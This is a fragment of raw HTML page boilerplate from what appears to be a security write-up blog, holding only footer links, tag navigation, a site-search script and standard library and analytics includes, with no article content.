class="footer-left"> <a href="https://twitter.com/0x3n0?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-size="large" data-dnt="true" data-show-count="false">Follow @0x3n0</a><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script></div><script src="https://www.hackthebox.com/badge/381523"></script></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/oscp-prep/">oscp prep</a> <a class="post-tag" href="/tags/htb-linux-easy/">htb linux easy</a> <a class="post-tag" href="/tags/htb-windows-easy/">htb windows easy</a> <a class="post-tag" href="/tags/reverse-shell/">reverse shell</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/c/">C++</a> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/programming/">Programming</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
